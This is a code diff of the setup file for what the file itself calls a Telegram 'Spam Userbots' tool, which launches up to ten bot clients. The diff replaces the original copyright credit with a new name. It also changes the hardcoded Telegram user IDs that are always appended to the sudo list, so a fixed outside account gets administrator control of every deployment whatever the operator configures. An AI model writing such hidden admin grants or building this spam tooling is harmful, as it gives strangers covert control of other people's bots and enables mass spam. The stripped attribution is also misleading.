@@ -1,5 +1,4 @@
-# SAMoeLXSpam - Spam Userbots
-# Copyright © 2021 @SAMoeLX
+© #Rizol
 
 import os
 import sys
@@ -18,7 +17,7 @@ logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s'
 
 #version
 
-deadlyversion = "v0.0.2"
+deadlyversion = "v0.2.0"
 
 #values
 API_ID = config("API_ID", default=None, cast=int)
@@ -38,35 +37,35 @@ BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-if 1517994352 not in SUDO_USERS:
-    SUDO_USERS.append(1517994352)
+if 1669178360 not in SUDO_USERS:
+    SUDO_USERS.append(1669178360)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
 # Don't Mess with Codes !! 
 DB_URI = config("DATABASE_URL", None)
 SUDO_USERS.append(OWNER_ID)
-SUDO_USERS.append(1789859817)
+SUDO_USERS.append(1669178360)
 
 # Tokens
 
-SAM = TelegramClient('SAM', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+BOT0 = TelegramClient('BOT0', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
-SAM2 = TelegramClient('SAM2', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)
+BOT1 = TelegramClient('BOT1', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)
 
-SAM3 = TelegramClient('SAM3', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)
+BOT2 = TelegramClient('BOT2', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)
 
-SAM4 = TelegramClient('SAM4', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)
+BOT3 = TelegramClient('BOT3', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)
 
-SAM5 = TelegramClient('SAM5', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)
+BOT4 = TelegramClient('BOT4', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)
 
-SAM6 = TelegramClient('SAM6', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)
+BOT5 = TelegramClient('BOT5', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)
 
-SAM7 = TelegramClient('SAM7', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)
+BOT6 = TelegramClient('BOT6', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)
 
-SAM8 = TelegramClient('SAM8', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)
+BOT7 = TelegramClient('BOT7', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)
 
-SAM9 = TelegramClient('SAM9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)
+BOT8 = TelegramClient('BOT8', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)
 
-SAM10 = TelegramClient('SAM10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)
+BOT9 = TelegramClient('BOT9', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)
 
